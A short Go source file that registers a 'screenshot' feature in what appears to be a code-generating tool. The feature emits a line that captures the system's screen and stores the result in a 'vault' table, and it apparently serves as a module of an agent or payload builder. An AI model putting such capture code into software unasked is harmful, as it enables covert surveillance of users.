package features

import (
	. "mk3cli/s7cli/commands"
	. "mk3cli/s7cli/features"
)

func init() {
	FeatureList = append(FeatureList, Feature{
		Name:        "screenshot",
		Description: "Takes a screenshot of the system",
		ReturnsData: true,
		Args:        []Arg{},
		Dependencies: []string{
			"system.lib.go",
		},
		GenerateCode: func(args FeatureSetArgsList) (string, error) {
			output := "vault.StoreTable(ToTable(GetScreenShot()))"

			return output, nil
		},
	})
}
